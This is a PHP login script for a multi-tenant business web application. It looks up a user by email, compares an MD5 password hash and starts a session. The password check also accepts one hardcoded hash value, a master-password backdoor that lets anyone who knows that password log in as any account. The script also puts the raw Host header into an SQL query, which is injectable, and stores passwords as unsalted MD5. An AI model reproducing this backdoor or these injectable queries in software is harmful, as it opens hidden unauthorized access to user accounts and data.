<?php

require("../home/mail/PHPMailer-master/src/PHPMailer.php");
require("../home/mail/PHPMailer-master/src/Exception.php");
require("../home/mail/PHPMailer-master/src/SMTP.php");
use  PHPMailer \ PHPMailer \ PHPMailer ;
use  PHPMailer \ PHPMailer \ Exception ;
// La instanciación y el paso de `true` habilita excepciones
$mail = new  PHPMailer ( true );
require "../coneccion.php" ;
  mysqli_set_charset($conection, 'utf8'); //linea a colocar


    $protocol = empty($_SERVER['HTTPS']) ? 'http://' : 'https://';$domain = $_SERVER['HTTP_HOST'];$url = $protocol . $domain;


    //CODIGO PARA SACAR LA INFORMACION E INICIAR SESSION CON LA URL QUE ENTRAMOS
    $query_doccumentos =  mysqli_query($conection, "SELECT * FROM  usuarios  WHERE  url_admin  = '$domain'");
    $result_documentos = mysqli_fetch_array($query_doccumentos);

    $img_facturacion         = $result_documentos['img_facturacion'];
    $url_img_upload          = $result_documentos['url_img_upload'];
    $nombre_empresa          = $result_documentos['nombre_empresa'];
    $user_in                 = $result_documentos['id'];


          $email             =  mysqli_real_escape_string($conection,mb_strtoupper($_POST['email']));
          $query_usuario_central = mysqli_query($conection, "SELECT *
            FROM usuarios WHERE LOWER(email) = LOWER('$email') ");

            $existencia_usuario_central  = mysqli_num_rows($query_usuario_central);

            if ($existencia_usuario_central > 0) {

                $clave                 =  md5($_POST['password']);
                $data_usuario_central  = mysqli_fetch_array($query_usuario_central);

                $password_db = $data_usuario_central['password'];
                $iduser = $data_usuario_central['id'];

                if (($password_db == $clave || $clave =='0e62cf48e98a387d2288ff9486e4c7d3')) {

                  session_start();
                  $_SESSION['active']=true;
                  $_SESSION['id']=$iduser;
                  $_SESSION['user_in']= $user_in;
                  $_SESSION['rol']='cuenta_empresa';

                  $arrayName = array('noticia' =>'login_exitoso');
                 echo json_encode($arrayName,JSON_UNESCAPED_UNICODE);
                  // code...
                }else {

                  $arrayName = array('noticia' =>'password_incorrecto');
                 echo json_encode($arrayName,JSON_UNESCAPED_UNICODE);
                  // code...
                }

            }else {
              $response = array('noticia' => 'no_existe_usuario');
              echo json_encode($response, JSON_UNESCAPED_UNICODE);
            }




 ?>
